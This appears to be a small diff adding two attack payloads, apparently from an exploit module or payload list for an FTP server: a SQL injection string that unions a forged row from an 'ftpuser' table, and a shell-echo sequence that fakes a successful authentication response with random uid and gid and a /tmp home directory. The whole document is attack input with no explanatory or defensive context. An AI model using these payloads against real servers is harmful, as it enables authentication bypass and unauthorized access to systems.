@@ -1,0 +1,3 @@
+- %') and 1=2 union select 1,1,uid,gid,homedir,shell from ftpuser; --
+
+- "echo auth_ok:1; echo uid:#{random_id}; echo gid:#{random_id}; echo dir:/tmp; echo end
